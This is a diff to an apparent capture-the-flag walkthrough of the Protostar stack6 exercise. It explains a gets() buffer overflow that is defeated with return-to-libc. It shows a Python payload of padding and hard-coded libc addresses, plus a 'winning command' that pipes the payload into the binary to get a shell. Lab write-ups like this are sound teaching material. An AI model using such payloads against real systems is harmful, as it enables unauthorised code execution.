@@ -591,7 +591,7 @@ int main(int argc, char **argv)
 | eip | ebp | int ret |char buffer[64]  |
 
 ###Plan:
-So this program basically uses gets to grab an input for buffer, then uses builtin_return_address(0) to get the return address of the current function and prevents it from returning to any address in the 0xbf------ range.(likely where our buffer is to prevent shellcode execution). So in this one, we will go a different route, such as Return to libc or ROP chaining.
+So this program basically uses gets to grab an input for buffer, then uses builtin_return_address(0) to get the return address of the current function and prevents it from returning to any address in the 0xbf------ range.(likely where our buffer is to prevent shellcode execution). So in this one, we will go a different route and use Return to libc.
 
 First we need to find our offset 
 
@@ -696,13 +696,16 @@ For mine, i wanted it to exit cleanly after the shell, so i made SYSTEM's return
 print 'A'*0x50 + '\x90\xc1\x5c\x55'+  '\xe0\xf1\x5b\x55'   +'\x24\xca\x6e\x55'"
 ```
 
+Now, we need to do the same trick to keep stdin open by using  (cat payload; cat) | ./path - see below  
 
 ###winning command:
 ```bash
 $ python -c "print 'A'*0x50+'\x90\xc1\x5c\x55'+  '\xe0\xf1\x5b\x55'   +'\x24\xca\x6e\x55'" > stack6sploit
+ (cat stack6sploit; cat) | ./stack6   
 ```
 ###Python exploit:
 ```Python
+COMING SOON
 ```
 
 
